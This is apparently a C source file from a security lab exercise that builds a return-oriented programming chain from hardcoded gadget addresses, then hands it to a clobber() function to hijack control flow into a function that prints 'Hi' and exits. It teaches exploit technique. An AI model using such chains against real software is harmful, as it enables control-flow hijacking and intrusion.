#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <alloca.h>
#include <stdint.h>

#include <sys/mman.h>

void clobber(char*, int);
const char hiStr[] = "Hi\n";

void printAndExit(char* s)
{
    puts(s);
    exit(0);
}

int main(int argc, char** argv)
{
    char* x = alloca(256);
    unsigned char* m = malloc(128);
    unsigned char* gadget1 = malloc(64); 
    unsigned char* gadget2 = malloc(64); 
    unsigned char* gadget3 = malloc(64); 
    
    puts("Activity 3!");
    if (m == NULL)
    {
        fprintf(stderr, "Allocation failure\n");
        return -1;
    }

#if 0

    *(uint64_t*)gadget1 = 0x44cb3c; //pop %rdi; retq
    *(uint64_t*)gadget2 = 0x440b15; //pop %rbp; retq
    *(uint64_t*)gadget3 = 0x44014c; //call *%rbp

    *(uint64_t*) m = *(uint64_t*)gadget1;
    *(uint64_t*) (m + 8) = (uint64_t)(hiStr); //will be pop to rdi as the printAndExit argument s
    *(uint64_t*) (m + 16) = *(uint64_t*)gadget2;
    *(uint64_t*) (m + 24) = (uint64_t)(&printAndExit); //will be pop to rbp for call *$rbp
    *(uint64_t*) (m + 32) = *(uint64_t*)gadget3;
    clobber(m, 40);

#else

/*******************************************************************************
instead of pop (&printAndExit) to %rbp and using call *%rbp, we can just use ret
to set rip = (&printAndExit) by a retq gadget (gadget2)
    
*******************************************************************************/
    *(uint64_t*)gadget1 = 0x441925; //pop %rdi; retq
    *(uint64_t*)gadget2 = 0x441926; //retq

    *(uint64_t*) m = *(uint64_t*)gadget1;
    *(uint64_t*) (m + 8) = (uint64_t)(hiStr); //will be pop to rdi as the printAndExit argument s
    *(uint64_t*) (m + 16) = *(uint64_t*)gadget2;
    *(uint64_t*) (m + 24) = (uint64_t)(&printAndExit); //will be pop to rbp for call *$rbp
    clobber(m, 32);
    
#endif

    
    return 0;
}
